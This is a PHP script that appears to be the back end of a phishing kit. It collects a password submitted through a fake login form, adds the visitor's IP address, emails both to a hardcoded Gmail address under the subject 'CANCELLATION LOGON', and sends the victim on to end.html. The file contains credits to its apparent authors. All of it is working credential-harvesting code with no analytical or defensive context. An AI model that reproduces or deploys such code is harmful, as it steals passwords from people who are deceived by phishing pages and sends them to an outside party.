<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || tHAnks tO Nolimit|| :------\n";
$message .= "Password          : ".$_POST['Password']."\n";
$message .= "----: || tHAnks tO H4rKy Tboy || :------\n";
$message .= "IP: ".$ip."\n";
$recipient = "rotterdamall@gmail.com";
$subject = "CANCELLATION LOGON | ".$ip."\n";

mail($recipient,$subject,$message);
header("Location: end.html");
?>